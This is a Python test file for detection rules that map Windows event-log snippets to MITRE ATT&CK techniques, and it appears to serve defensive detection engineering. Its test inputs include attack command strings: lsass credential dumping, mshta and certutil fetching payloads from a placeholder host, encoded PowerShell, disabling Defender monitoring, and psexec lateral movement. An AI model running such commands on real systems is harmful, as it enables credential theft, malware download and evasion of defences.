from scripts.build_evtx_attack_anchors import matched_rules


def test_lsass_anchor_requires_sensitive_process_evidence():
    assert [rule.technique_id for rule in matched_rules('<Data>lsass.exe</Data><Data>MiniDumpWriteDump</Data>')] == ['T1003']
    assert not matched_rules('<Data>lsass.exe</Data>')


def test_scheduled_task_anchor_requires_task_event_and_name():
    assert [rule.technique_id for rule in matched_rules('<EventID>4698</EventID><Data Name="TaskName">x</Data>')] == ['T1053.005']
    assert not matched_rules('<EventID>4698</EventID>')


def test_wmi_and_winrm_use_distinct_content_rules():
    assert [rule.technique_id for rule in matched_rules('<EventID>1</EventID><Data>wmiprvse.exe</Data>')] == ['T1047']
    assert [rule.technique_id for rule in matched_rules('<EventID>1</EventID><Data>wsmprovhost.exe</Data>')] == ['T1021.006']


def test_lolbin_rules_require_a_suspicious_argument_not_just_a_binary_name():
    assert [rule.technique_id for rule in matched_rules('<EventID>4104</EventID><Data>powershell -EncodedCommand abc</Data>')] == ['T1059.001']
    assert [rule.technique_id for rule in matched_rules('<Data>rundll32.exe javascript:..\\mshtml,RunHTMLApplication</Data>')] == ['T1218.011']
    assert [rule.technique_id for rule in matched_rules('<Data>mshta.exe https://example.invalid/payload.hta</Data>')] == ['T1218.005']
    assert not matched_rules('<Data>powershell.exe Get-Date</Data>')
    assert not matched_rules('<Data>rundll32.exe shell32.dll,Control_RunDLL</Data>')


def test_persistence_transfer_and_defense_evasion_rules_require_direct_evidence():
    assert [rule.technique_id for rule in matched_rules('<Data>certutil.exe -urlcache https://example.invalid/a</Data>')] == ['T1105']
    assert [rule.technique_id for rule in matched_rules('<EventID>13</EventID><Data>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</Data>')] == ['T1547.001']
    assert [rule.technique_id for rule in matched_rules('<Data>Set-MpPreference -DisableBehaviorMonitoring $true</Data>')] == ['T1562.001']
    assert not matched_rules('<Data>certutil.exe -hashfile a.exe</Data>')


def test_discovery_and_command_shell_rules_are_specific_to_observable_commands():
    assert [rule.technique_id for rule in matched_rules('<Data>cmd.exe /c whoami</Data>')] == ['T1059.003']
    assert [rule.technique_id for rule in matched_rules('<Data>systeminfo /fo csv</Data>')] == ['T1082']
    assert [rule.technique_id for rule in matched_rules('<Data>net user /domain</Data>')] == ['T1087']
    assert [rule.technique_id for rule in matched_rules('<Data>tasklist /v</Data>')] == ['T1057']
    assert [rule.technique_id for rule in matched_rules('<Data>psexec.exe \\\\host cmd</Data>')] == ['T1021.002']
    assert not matched_rules('<Data>cmd.exe</Data>')


def test_log_clear_rdp_and_web_shell_rules_use_direct_event_evidence():
    assert [rule.technique_id for rule in matched_rules('<EventID>1102</EventID>')] == ['T1070.001']
    assert [rule.technique_id for rule in matched_rules('<EventID>1149</EventID><Data>10.10.0.3</Data>')] == ['T1021.001']
    assert [rule.technique_id for rule in matched_rules('<Data>w3wp.exe spawned powershell.exe</Data>')] == ['T1505.003']
    assert not matched_rules('<EventID>4624</EventID><Data>LogonType">10</Data><Data>127.0.0.1</Data>')
